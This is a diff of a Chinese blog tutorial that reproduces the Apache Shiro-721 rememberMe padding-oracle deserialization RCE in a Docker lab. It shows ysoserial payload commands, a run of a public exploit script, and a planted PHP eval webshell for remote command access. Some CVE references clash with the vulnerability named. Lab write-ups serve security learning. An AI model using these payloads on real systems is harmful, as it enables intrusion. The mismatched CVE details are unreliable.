@@ -263,13 +263,23 @@
 </div>
 <div class="article-content">
     <div id="article" class="content">
-        <h2 id="Apache-Shiro-反序列化漏洞（Shiro-721-CVE-2016-4437）"><a href="#Apache-Shiro-反序列化漏洞（Shiro-721-CVE-2016-4437）" class="headerlink" title="Apache Shiro 反序列化漏洞（Shiro-721 CVE-2016-4437）"></a>Apache Shiro 反序列化漏洞（Shiro-721 CVE-2016-4437）</h2><h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><p>复现环境: Apache Shiro 1.4.1 + tomcat:8-jre8<br>git下载shiro-720到本地环境</p>
+        <h2 id="Apache-Shiro-反序列化漏洞（Shiro-721-CVE-2016-4437）"><a href="#Apache-Shiro-反序列化漏洞（Shiro-721-CVE-2016-4437）" class="headerlink" title="Apache Shiro 反序列化漏洞（Shiro-721 CVE-2016-4437）"></a>Apache Shiro 反序列化漏洞（Shiro-721 CVE-2016-4437）</h2><blockquote>
+<p>Apache Shiro是一个强大且易用的Java安全框架,其支持身份验证、授权、密码和会话管理等。使用Shiro的API可以快速、轻松地获得任何应用程序。</p>
+<p>2021年02月01日，Apache Shiro发布1.7.1版本，修复了 Apache Shiro 中的一个身份验证绕过漏洞（CVE-2020-17523）。当Apache Shiro与Spring结合使用时，攻击者可以使用恶意HTTP请求来绕过Shiro的身份认证。成功利用此漏洞的攻击者可以绕过身份验证，成功访问后台。</p>
+</blockquote>
+<blockquote>
+<p>Apache Shiro 存在高危代码执行漏洞。该漏洞是由于Apache Shiro cookie中通过 AES-128-CBC 模式加密的rememberMe字段存在问题，用户可通过Padding Oracle 加密生成的攻击代码来构造恶意的rememberMe字段，并重新请求网站，进行反序列化攻击，最终导致任意代码执行。</p>
+</blockquote>
+<h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><p>复现环境: Apache Shiro 1.4.1 + tomcat:8-jre8<br>git下载shiro-720到本地环境</p>
 <figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/3ndz/</span>Shiro-<span class="hljs-number">721</span>.git<br></code></pre></td></tr></table></figure>
+
 <p>对shiro-720进行编译</p>
 <figure class="highlight mipsasm"><table><tr><td class="code"><pre><code class="hljs mipsasm">cd <span class="hljs-keyword">Shiro-721/Docker</span><br><span class="hljs-keyword">docker </span><span class="hljs-keyword">build </span>-t <span class="hljs-keyword">shiro-721 </span>.<br></code></pre></td></tr></table></figure>
+
 <p><img src="https://img-blog.csdnimg.cn/20210620132903892.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 <p>启动dokcer并将端口8080映射到主机端口9000上</p>
 <figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> run -p <span class="hljs-number">9000</span>:<span class="hljs-number">8080</span> -d shiro-<span class="hljs-number">721</span><br></code></pre></td></tr></table></figure>
+
 <p>查看是否搭建成功</p>
 <figure class="highlight ebnf"><table><tr><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">docker ps</span><br></code></pre></td></tr></table></figure>
 
@@ -279,27 +289,34 @@
 
 <p><img src="https://img-blog.csdnimg.cn/20210620133119100.png" alt="在这里插入图片描述"></p>
 <figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">tar</span> zxvf  apache-maven-<span class="hljs-number">3</span>.<span class="hljs-number">6</span>.<span class="hljs-number">3</span>-bin.tar.gz  -C  /usr/local<br></code></pre></td></tr></table></figure>
+
 <p><img src="https://img-blog.csdnimg.cn/20210620133234604.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 <p>添加环境变量</p>
 <figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros">vi /etc/profile<br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">MAVEN_HOME</span>=/usr/local/apache-maven-3.6.3<br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">PATH</span>=<span class="hljs-variable">$MAVEN_HOME</span>/bin:$PATH <br></code></pre></td></tr></table></figure>
+
 <p><img src="https://img-blog.csdnimg.cn/20210620133359541.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 <p>进入父bash查看mvn版本</p>
 <figure class="highlight gradle"><table><tr><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">source</span> <span class="hljs-regexp">/etc/</span>profile<br>mvn -v <br></code></pre></td></tr></table></figure>
+
 <p><img src="https://img-blog.csdnimg.cn/20210620133509501.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 <figure class="highlight dts"><table><tr><td class="code"><pre><code class="hljs dts">vim  <span class="hljs-meta-keyword">/usr/</span>local/apache-maven<span class="hljs-number">-3.6</span><span class="hljs-number">.3</span><span class="hljs-meta-keyword">/conf/</span>settings.xml<br>找到mirrors节点添加阿里镜像库地址：<br><span class="hljs-params">&lt;mirrors&gt;</span><br>    <span class="hljs-params">&lt;mirror&gt;</span><br>      <span class="hljs-params">&lt;id&gt;</span>alimaven<span class="hljs-params">&lt;/id&gt;</span><br>      <span class="hljs-params">&lt;name&gt;</span>aliyun maven<span class="hljs-params">&lt;/name&gt;</span><br>      <span class="hljs-params">&lt;url&gt;</span>http:<span class="hljs-comment">//maven.aliyun.com/nexus/content/groups/public/&lt;/url&gt;</span><br>      <span class="hljs-params">&lt;mirrorOf&gt;</span>central<span class="hljs-params">&lt;/mirrorOf&gt;</span>        <br>    <span class="hljs-params">&lt;/mirror&gt;</span><br>  <span class="hljs-params">&lt;/mirrors&gt;</span><br></code></pre></td></tr></table></figure>
+
 <p><img src="https://img-blog.csdnimg.cn/2021062013361645.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>从 Apache Shiro Gtihub 官方仓库自行下载漏洞影响版本(<a target="_blank" rel="noopener" href="https://github.com/apache/shiro)%EF%BC%8C%E4%BD%BF%E7%94%A8">https://github.com/apache/shiro)，使用</a> Apache Maven(软件项目管理及自动构建工具) 编译构建生成 war Java 应用程序包。</p>
 <figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/apache/</span>shiro.git<br></code></pre></td></tr></table></figure>
 
 <p>然后在执行</p>
 <figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">cd</span> shiro<br><span class="hljs-attribute">git</span> checkout shiro-root-<span class="hljs-number">1</span>.<span class="hljs-number">4</span>.<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+
 <p>到这则搭建的没有问题<br><img src="https://img-blog.csdnimg.cn/20210620133711170.png" alt="在这里插入图片描述"></p>
 <p>然后</p>
 <figure class="highlight armasm"><table><tr><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">cd</span> samples/web<br><span class="hljs-keyword">mvn</span> install<br></code></pre></td></tr></table></figure>
+
 <p><img src="https://img-blog.csdnimg.cn/20210620133930385.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>将编译完成获取到的 samples-web-1.4.1.war 包( samples/target/中）拷贝到 Tomcat 的 webapps 目录下，启动tomcat即可。使用命令</p>
 <figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">sudo docker cp 虚拟机里的war绝对路径 docker容器ID:<span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/tomcat/</span>webapps<br></code></pre></td></tr></table></figure>
+
 <p>然后打开http://自己虚拟机的IP:9000/samples-web-1.4.1/</p>
 <p><img src="https://img-blog.csdnimg.cn/20210620134413592.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h3 id="复现步骤："><a href="#复现步骤：" class="headerlink" title="复现步骤："></a>复现步骤：</h3><h6 id="输入正确的用户名和密码登录网站（勾选Remember），并从cookie中获取RememberMe值。"><a href="#输入正确的用户名和密码登录网站（勾选Remember），并从cookie中获取RememberMe值。" class="headerlink" title="输入正确的用户名和密码登录网站（勾选Remember），并从cookie中获取RememberMe值。"></a>输入正确的用户名和密码登录网站（勾选Remember），并从cookie中获取RememberMe值。</h6><h6 id="使用RememberMe-cookie作为Padding-Oracle-Attack的前缀。"><a href="#使用RememberMe-cookie作为Padding-Oracle-Attack的前缀。" class="headerlink" title="使用RememberMe cookie作为Padding Oracle Attack的前缀。"></a>使用RememberMe cookie作为Padding Oracle Attack的前缀。</h6><h6 id="加密ysoserial的序列化有效负载，以通过Padding-Oracle-Attack制作精心制作的RememberMe。"><a href="#加密ysoserial的序列化有效负载，以通过Padding-Oracle-Attack制作精心制作的RememberMe。" class="headerlink" title="加密ysoserial的序列化有效负载，以通过Padding Oracle Attack制作精心制作的RememberMe。"></a>加密ysoserial的序列化有效负载，以通过Padding Oracle Attack制作精心制作的RememberMe。</h6><h6 id="请求带有新的RememberMe-cookie的网站，以执行反序列化攻击。"><a href="#请求带有新的RememberMe-cookie的网站，以执行反序列化攻击。" class="headerlink" title="请求带有新的RememberMe cookie的网站，以执行反序列化攻击。"></a>请求带有新的RememberMe cookie的网站，以执行反序列化攻击。</h6><h6 id="攻击者无需知道RememberMe加密的密码密钥。"><a href="#攻击者无需知道RememberMe加密的密码密钥。" class="headerlink" title="攻击者无需知道RememberMe加密的密码密钥。"></a>攻击者无需知道RememberMe加密的密码密钥。</h6><h3 id="漏洞复现："><a href="#漏洞复现：" class="headerlink" title="漏洞复现："></a>漏洞复现：</h3><h5 id="一-漏洞利用复现01"><a href="#一-漏洞利用复现01" class="headerlink" title="一.漏洞利用复现01"></a>一.漏洞利用复现01</h5><p>登录 Shiro 测试账户获取合法 Cookie（勾选Remember Me）：</p>
+<h3 id="测试与结果"><a href="#测试与结果" class="headerlink" title="测试与结果"></a>测试与结果</h3><h4 id="复现步骤："><a href="#复现步骤：" class="headerlink" title="复现步骤："></a>复现步骤：</h4><h6 id="输入正确的用户名和密码登录网站（勾选Remember），并从cookie中获取RememberMe值。"><a href="#输入正确的用户名和密码登录网站（勾选Remember），并从cookie中获取RememberMe值。" class="headerlink" title="输入正确的用户名和密码登录网站（勾选Remember），并从cookie中获取RememberMe值。"></a>输入正确的用户名和密码登录网站（勾选Remember），并从cookie中获取RememberMe值。</h6><h6 id="使用RememberMe-cookie作为Padding-Oracle-Attack的前缀。"><a href="#使用RememberMe-cookie作为Padding-Oracle-Attack的前缀。" class="headerlink" title="使用RememberMe cookie作为Padding Oracle Attack的前缀。"></a>使用RememberMe cookie作为Padding Oracle Attack的前缀。</h6><h6 id="加密ysoserial的序列化有效负载，以通过Padding-Oracle-Attack制作精心制作的RememberMe。"><a href="#加密ysoserial的序列化有效负载，以通过Padding-Oracle-Attack制作精心制作的RememberMe。" class="headerlink" title="加密ysoserial的序列化有效负载，以通过Padding Oracle Attack制作精心制作的RememberMe。"></a>加密ysoserial的序列化有效负载，以通过Padding Oracle Attack制作精心制作的RememberMe。</h6><h6 id="请求带有新的RememberMe-cookie的网站，以执行反序列化攻击。"><a href="#请求带有新的RememberMe-cookie的网站，以执行反序列化攻击。" class="headerlink" title="请求带有新的RememberMe cookie的网站，以执行反序列化攻击。"></a>请求带有新的RememberMe cookie的网站，以执行反序列化攻击。</h6><h6 id="攻击者无需知道RememberMe加密的密码密钥。"><a href="#攻击者无需知道RememberMe加密的密码密钥。" class="headerlink" title="攻击者无需知道RememberMe加密的密码密钥。"></a>攻击者无需知道RememberMe加密的密码密钥。</h6><h4 id="漏洞复现："><a href="#漏洞复现：" class="headerlink" title="漏洞复现："></a>漏洞复现：</h4><h5 id="一-漏洞利用复现01"><a href="#一-漏洞利用复现01" class="headerlink" title="一.漏洞利用复现01"></a>一.漏洞利用复现01</h5><p>登录 Shiro 测试账户获取合法 Cookie（勾选Remember Me）：</p>
 <p><img src="https://img-blog.csdnimg.cn/20210620184816156.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 <p>认证失败时（输入错误的用户名和密码），http响应页面中会显示出deleteMe的cookie:</p>
 <p><img src="https://img-blog.csdnimg.cn/20210620185017886.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>输入正确用户密码得到合法cookie：</p>
@@ -309,12 +326,15 @@
 <p>根据以上条件我们的思路是在正常序列化数据（需要一个已知的用户凭证获取正常序列化数据）后利用 Padding Oracle 构造我们自己的数据（Java序列化数据后的脏数据不影响反序列化结果），此时会有两中情况:</p>
 <p>构造的数据不能通过字符填充验证，返回deleteme;<br>构造的数据可以成功解密通过字符填充验证，之后数据可以正常反序列化，不返回deleteme的cookie.<br>这里输入正确的用户名和密码，并勾选Remeber ME。</p>
 <p>登录成功后，访问<a target="_blank" rel="noopener" href="http://192.168.1.14:8080/account/%EF%BC%8CF12%E5%BE%97%E5%88%B0Cookie%E4%B8%AD%E7%9A%84rememberMe%E5%80%BC">http://192.168.1.14:8080/account/，F12得到Cookie中的rememberMe值</a><br><img src="https://img-blog.csdnimg.cn/20210620190609805.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h3 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><p>使用Java反序列化工具 ysoserial 生成 Payload:</p>
+<h4 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h4><h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><p>使用Java反序列化工具 ysoserial 生成 Payload:</p>
 <figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">java</span>  -jar ysoserial-master-<span class="hljs-number">6</span>eca<span class="hljs-number">5</span>bc<span class="hljs-number">740</span>-<span class="hljs-number">1</span>.jar   CommonsCollections<span class="hljs-number">1</span> &#x27;touch /tmp/test&#x27; &gt; payload.class<br></code></pre></td></tr></table></figure>
+
 <p>通过git对其padding oracle attack  poc进行下载</p>
 <figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">git clone  https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/wuppp/</span>shiro_rce_exp.git<br></code></pre></td></tr></table></figure>
+
 <p>通过 Padding Oracle Attack 生成 Evil Rememberme cookie:<br>此 exp 爆破时间较长，建议使用 ysoserial 生成较短的 payload 验证（如： ping 、 touch /tmp/test等），生成成功后将自动停止运行。</p>
-<figure class="highlight vim"><table><tr><td class="code"><pre><code class="hljs vim"><br>也可用<span class="hljs-keyword">python</span>自动化脚本<br><span class="hljs-keyword">cp</span> payload.class  shiro_rce_exp/<br><span class="hljs-keyword">cd</span> shiro_rce_exp/<br><span class="hljs-keyword">python</span> shiro_exp.<span class="hljs-keyword">py</span> http://自己的ip:docker的端口/account/ 此处为上面获取Rememberme cookie payload.class<br></code></pre></td></tr></table></figure>
+<figure class="highlight vim"><table><tr><td class="code"><pre><code class="hljs vim">也可用<span class="hljs-keyword">python</span>自动化脚本<br><span class="hljs-keyword">cp</span> payload.class  shiro_rce_exp/<br><span class="hljs-keyword">cd</span> shiro_rce_exp/<br><span class="hljs-keyword">python</span> shiro_exp.<span class="hljs-keyword">py</span> http://自己的ip:docker的端口/account/ 此处为上面获取Rememberme cookie payload.class<br></code></pre></td></tr></table></figure>
+
 <p><img src="https://img-blog.csdnimg.cn/20210625224820201.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210625224946755.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 <p>使用Evil Rememberme cookie 认证进行反序列化攻击：复制该cookie，然后重放一下数据，即可成功执行命令,此处脚本爆破出正确的Rememberme cookie需要较长时间。<br><img src="https://img-blog.csdnimg.cn/20210625225948360.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 <p>还可以用dnslog提供的dns地址解析来验证</p>
@@ -324,13 +344,14 @@
 <p><img src="https://img-blog.csdnimg.cn/20210626015025253.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210626142410269.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 <p><img src="https://img-blog.csdnimg.cn/20210626020227297.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 <p>最后有加号即存在漏洞</p>
-<h3 id="提权shell"><a href="#提权shell" class="headerlink" title="提权shell"></a>提权shell</h3><p>生成payload然后用上述方法获取恶意rememberkey<br><img src="https://img-blog.csdnimg.cn/20210626021101672.png" alt="在这里插入图片描述"></p>
+<h4 id="提权shell"><a href="#提权shell" class="headerlink" title="提权shell"></a>提权shell</h4><p>生成payload然后用上述方法获取恶意rememberkey</p>
 <figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">java</span>  -jar ysoserial-master-d<span class="hljs-number">367</span>e<span class="hljs-number">379</span>d<span class="hljs-number">9</span>-<span class="hljs-number">1</span>.jar  CommonsCollections<span class="hljs-number">1</span> &#x27;touch /usr/local/tomcat/webapps/samples-web-<span class="hljs-number">1</span>.<span class="hljs-number">4</span>.<span class="hljs-number">1</span>/<span class="hljs-number">1</span>.php&#x27; &gt; payload<span class="hljs-number">2</span>.class<br><br><span class="hljs-attribute">java</span>  -jar ysoserial-master-d<span class="hljs-number">367</span>e<span class="hljs-number">379</span>d<span class="hljs-number">9</span>-<span class="hljs-number">1</span>.jar  CommonsCollections<span class="hljs-number">1</span> &#x27;echo <span class="hljs-string">&quot;&lt;?php eval($_POST[&quot;</span>cmd<span class="hljs-string">&quot;]);&quot;</span> &gt; /usr/local/tomcat/webapps/samples-web-<span class="hljs-number">1</span>.<span class="hljs-number">4</span>.<span class="hljs-number">1</span>/<span class="hljs-number">1</span>.php&#x27; &gt; payload<span class="hljs-number">2</span>.class<br><br></code></pre></td></tr></table></figure>
 
 <p><img src="https://img-blog.csdnimg.cn/20210626141447776.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 <p>重放之后进入1.php可看到内容</p>
 <p><img src="https://img-blog.csdnimg.cn/20210626142151449.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 <p>最后用蚁剑连接即可，或者直接shrio工具反弹shell</p>
+<p><img src="https://img-blog.csdnimg.cn/20210626144042750.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210626152005550.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 
     </div>
 </div>
